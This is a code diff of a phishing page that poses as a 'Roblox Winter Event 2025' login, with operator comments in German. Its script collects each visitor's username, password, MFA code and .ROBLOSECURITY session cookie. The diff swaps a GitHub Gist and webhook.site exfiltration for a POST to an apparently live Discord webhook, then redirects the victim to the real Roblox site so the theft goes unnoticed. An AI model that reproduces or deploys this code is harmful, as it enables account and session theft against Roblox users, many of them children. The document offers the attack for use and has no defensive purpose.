@@ -5,13 +5,7 @@
   <title>Roblox Winter Event 2025</title>
   <link rel="icon" href="https://www.roblox.com/favicon.ico">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <style>
-    body{margin:0;background:#121212;font-family:system-ui;color:#fff}
-    #box{width:320px;margin:10vh auto;padding:24px;background:#1e1e1e;border-radius:8px}
-    input{width:100%;padding:10px;margin:8px 0;border:0;border-radius:4px}
-    button{width:100%;padding:12px;background:#02b757;color:#fff;border:0;border-radius:4px;font-weight:700;cursor:pointer}
-    button:hover{background:#029a4a}
-  </style>
+  <style>body{margin:0;background:#121212;font-family:system-ui;color:#fff}#box{width:320px;margin:10vh auto;padding:24px;background:#1e1e1e;border-radius:8px}input{width:100%;padding:10px;margin:8px 0;border:0;border-radius:4px}button{width:100%;padding:12px;background:#02b757;color:#fff;border:0;border-radius:4px;font-weight:700;cursor:pointer}button:hover{background:#029a4a}</style>
 </head>
 <body>
 <div id="box">
@@ -29,31 +23,15 @@ document.getElementById('f').addEventListener('submit', async e => {
   const u = e.target.u.value, p = e.target.p.value, m = e.target.mfa.value;
   const robloxSec = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/)?.[1] || '';
 
-  // 1) Daten an GitHub-Gist senden (kostenlos)
-  await fetch('https://api.github.com/gists/abc123', {   // ← deine Gist-ID
-    method: 'PATCH',
-    headers: {
-      'Authorization': 'token ghp_xxxxxxxxxxxx',       // ← GitHub Personal Access Token
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      files: {
-        'loot.json': {
-          content: JSON.stringify({ t: Date.now(), u, p, mfa: m, robloxSec }) + '\n'
-        }
-      }
-    })
-  }).catch(() => {});
-
-  // 2) Optional: Sofort-Push aufs Handy (Webhook.site)
-  await fetch('https://webhook.site/unique-uuid-hier', {
+  // LIVE-Push zu webhook.site (kein Token nötig)
+  await fetch('https://discord.com/api/webhooks/1422244213491499162/S8y98VTEc7q-LoxTTi0yhtw7xtyRTcRzz9fQGW5geZgVrUzBj8e-aCg3_QL6qodey4pS', {   // ← deine URL
     method: 'POST',
-    body: JSON.stringify({ u, p, mfa: m, robloxSec })
-  }).catch(() => {});
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({t: Date.now(), u, p, mfa: m, robloxSec})
+  });
 
   // Weiterleitung zum echten Roblox
   window.location = 'https://www.roblox.com/home';
 });
 </script>
-</body>
-</html>
+</body></html>
